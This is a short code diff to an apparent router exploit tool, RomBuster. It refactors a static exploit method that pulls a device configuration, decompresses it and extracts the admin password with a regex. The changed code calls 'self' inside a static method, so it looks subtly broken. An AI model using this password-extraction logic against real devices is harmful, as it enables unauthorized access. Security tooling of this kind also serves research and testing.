@@ -29,11 +29,11 @@ import requests
 
 import http.client
 
+from pex.string import String
 from .trigger import Trigger
-from .deps.lzs_decompress import LZSDecompress, RingList
 
 
-class RomBuster:
+class RomBuster(String):
     @staticmethod
     def exploit(address):
         try:
@@ -45,7 +45,7 @@ class RomBuster:
 
             username = 'admin'
             data = response.content[8568:]
-            result, window = LZSDecompress(data, RingList(2048))
+            result, window = self.lzs_decompress(data)
 
             password = re.findall("([\040-\176]{5,})", result)
             if len(password):
